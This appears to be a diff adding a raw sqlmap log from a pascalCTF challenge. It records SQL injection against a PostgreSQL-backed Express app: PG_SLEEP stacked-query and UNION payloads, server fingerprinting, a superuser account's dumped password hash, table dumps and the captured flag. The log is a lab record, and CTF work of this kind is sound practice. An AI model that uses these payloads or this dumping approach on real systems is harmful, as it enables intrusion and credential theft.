@@ -1,0 +1,105 @@
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: group=';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: group=' UNION ALL SELECT (CHR(113)||CHR(112)||CHR(112)||CHR(107)||CHR(113))||(CHR(79)||CHR(98)||CHR(67)||CHR(115)||CHR(75)||CHR(118)||CHR(82)||CHR(85)||CHR(85)||CHR(118)||CHR(75)||CHR(105)||CHR(121)||CHR(114)||CHR(68)||CHR(121)||CHR(113)||CHR(109)||CHR(90)||CHR(114)||CHR(103)||CHR(66)||CHR(74)||CHR(87)||CHR(110)||CHR(113)||CHR(121)||CHR(118)||CHR(85)||CHR(112)||CHR(73)||CHR(107)||CHR(104)||CHR(113)||CHR(89)||CHR(118)||CHR(98)||CHR(85)||CHR(74)||CHR(98))||(CHR(113)||CHR(106)||CHR(122)||CHR(112)||CHR(113)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- stNh
+---
+web server operating system: Linux Ubuntu
+web application technology: Express, Nginx 1.26.0
+back-end DBMS: PostgreSQL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: group=';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: group=' UNION ALL SELECT (CHR(113)||CHR(112)||CHR(112)||CHR(107)||CHR(113))||(CHR(79)||CHR(98)||CHR(67)||CHR(115)||CHR(75)||CHR(118)||CHR(82)||CHR(85)||CHR(85)||CHR(118)||CHR(75)||CHR(105)||CHR(121)||CHR(114)||CHR(68)||CHR(121)||CHR(113)||CHR(109)||CHR(90)||CHR(114)||CHR(103)||CHR(66)||CHR(74)||CHR(87)||CHR(110)||CHR(113)||CHR(121)||CHR(118)||CHR(85)||CHR(112)||CHR(73)||CHR(107)||CHR(104)||CHR(113)||CHR(89)||CHR(118)||CHR(98)||CHR(85)||CHR(74)||CHR(98))||(CHR(113)||CHR(106)||CHR(122)||CHR(112)||CHR(113)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- stNh
+---
+web server operating system: Linux Ubuntu
+web application technology: Express, Nginx 1.26.0
+back-end DBMS operating system: Linux Debian
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 17.4 (Debian 17.4-1.pgdg120+2) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit'
+current user: 'web'
+current database (equivalent to schema on PostgreSQL): 'public'
+current user is DBA: True
+database management system users [1]:
+[*] web
+
+database management system users password hashes:
+[*] web [1]:
+    password hash: SCRAM-SHA-256$4096:ZFkavKfW5K7Zn8l2fAbSKg==$ik0ltwhAyXEzaEMdQjcH6e76oyasTjD7xIuEQ0P5mZg=:BuWV4AOz5W7klE9HpyFoKCSoRBjYL4cWsCgRssD5jy0=
+
+database management system users privileges:
+[*] web (administrator) [2]:
+    privilege: createdb
+    privilege: super
+
+database management system users roles:
+[*] web (administrator) [2]:
+    role: createdb
+    role: super
+
+Database: public
+Table: group_stats
+[24 entries]
++----------+------+-------+--------+--------+---------+----------------+-----------------+
+| group_id | wins | draws | losses | points | ranking | team_name      | goal_difference |
++----------+------+-------+--------+--------+---------+----------------+-----------------+
+| A        | 2    | 1     | 0      | 7      | 1       | Germany        | 6               |
+| A        | 1    | 2     | 0      | 5      | 2       | Switzerland    | 2               |
+| A        | 1    | 0     | 2      | 3      | 3       | Hungary        | -3              |
+| A        | 0    | 1     | 2      | 1      | 4       | Scotland       | -5              |
+| B        | 3    | 0     | 0      | 9      | 1       | Spain          | 5               |
+| B        | 1    | 1     | 1      | 4      | 2       | Italy          | 0               |
+| B        | 0    | 2     | 1      | 2      | 3       | Croatia        | -3              |
+| B        | 0    | 1     | 2      | 1      | 4       | Albania        | -2              |
+| C        | 1    | 2     | 0      | 5      | 1       | England        | 1               |
+| C        | 0    | 3     | 0      | 3      | 2       | Denmark        | 0               |
+| C        | 0    | 3     | 0      | 3      | 3       | Slovenia       | 0               |
+| C        | 0    | 2     | 1      | 2      | 4       | Serbia         | -1              |
+| D        | 2    | 0     | 1      | 6      | 1       | Austria        | 2               |
+| D        | 1    | 2     | 0      | 5      | 2       | France         | 1               |
+| D        | 1    | 1     | 1      | 4      | 3       | Netherlands    | 0               |
+| D        | 0    | 1     | 2      | 1      | 4       | Poland         | -3              |
+| E        | 1    | 1     | 1      | 4      | 1       | Romania        | 1               |
+| E        | 1    | 1     | 1      | 4      | 2       | Belgium        | 1               |
+| E        | 1    | 1     | 1      | 4      | 3       | Slovakia       | 0               |
+| E        | 1    | 1     | 1      | 4      | 4       | Ukraine        | -2              |
+| F        | 2    | 0     | 1      | 6      | 1       | Portugal       | 2               |
+| F        | 2    | 0     | 1      | 6      | 2       | Turkey         | 0               |
+| F        | 1    | 1     | 1      | 4      | 3       | Georgia        | 0               |
+| F        | 0    | 1     | 2      | 1      | 4       | Czech Republic | -2              |
++----------+------+-------+--------+--------+---------+----------------+-----------------+
+
+Database: public
+Table: flag
+[1 entry]
++------------------------------------------------+
+| flag                                           |
++------------------------------------------------+
+| pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder} |
++------------------------------------------------+
+
+Database: public
+Table: groups
+[6 entries]
++----+
+| id |
++----+
+| A  |
+| B  |
+| C  |
+| D  |
+| E  |
+| F  |
++----+
+
